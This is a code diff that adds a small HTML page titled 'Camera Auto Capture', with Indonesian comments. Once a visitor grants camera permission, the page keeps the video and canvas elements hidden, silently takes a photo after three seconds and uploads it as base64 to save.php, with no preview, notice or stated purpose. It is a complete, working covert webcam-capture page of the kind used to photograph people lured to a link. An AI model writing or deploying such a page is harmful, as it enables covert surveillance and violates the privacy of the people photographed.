@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Auto Capture</title>
+</head>
+<body>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const context = canvas.getContext('2d');
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    video.srcObject = stream;
+
+    // Tunggu 3 detik lalu ambil foto otomatis
+    setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+
+        const imageData = canvas.toDataURL("image/png");
+
+        fetch("save.php", {
+            method: "POST",
+            body: JSON.stringify({ image: imageData }),
+            headers: { "Content-Type": "application/json" }
+        });
+
+    }, 3000);
+})
+.catch(err => {
+    alert("Izin kamera diperlukan.");
+});
+</script>
+
+</body>
+</html>
